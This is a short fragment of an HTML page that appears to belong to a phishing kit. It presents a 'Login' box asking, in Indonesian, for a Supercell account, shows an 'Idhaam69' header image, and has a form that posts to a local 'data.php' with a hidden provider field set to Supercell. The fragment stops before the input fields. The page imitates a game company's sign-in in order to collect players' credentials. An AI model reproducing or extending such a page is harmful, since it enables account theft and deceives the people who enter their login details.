...
<body>
    ...
    <div class="idhaam69">
        <div class="header">
            <img class="img-header" src="../../assets/img/splog.png" alt="Idhaam69">
        </div>

        <div class="form-login">
            <div class="bd">Login<br>Gunakan Akun Supercell Anda</div>
            <form action="../data.php" method="POST">
                <input type="hidden" name="provider" value="Supercell">
